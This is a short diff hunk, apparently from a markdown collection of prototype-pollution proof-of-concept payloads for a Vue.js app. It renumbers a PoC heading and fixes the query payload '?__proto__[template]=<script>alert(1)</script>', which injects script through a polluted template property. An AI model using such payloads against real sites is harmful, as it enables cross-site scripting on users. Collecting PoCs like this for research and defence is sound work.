@@ -129,9 +129,9 @@ var app = new Vue({
 </script>
 ```
 
-#### PoC #5
+#### PoC #6
 ```
-?__proto__[template]=<script>alert(1)</script>"
+?__proto__[template]=<script>alert(1)</script>
 ```
 
 ```html
